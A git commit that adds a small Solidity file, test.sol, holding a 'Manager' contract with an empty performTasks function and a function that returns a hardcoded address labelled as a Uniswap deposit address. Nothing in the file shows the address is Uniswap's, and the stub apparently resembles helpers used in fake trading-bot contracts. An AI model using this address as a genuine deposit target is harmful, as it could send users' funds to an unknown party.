6502aa4a04776d01e6e3d4a4d047073c32d73887
Dexit-Network <96398816+Dexit-Network@users.noreply.github.com>
2022-11-22 15:49:28 +1100

    Create test.sol

---
+++ test.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x4599e891ED76A7783b8791F35524c2769768Da61;
+	}
+}
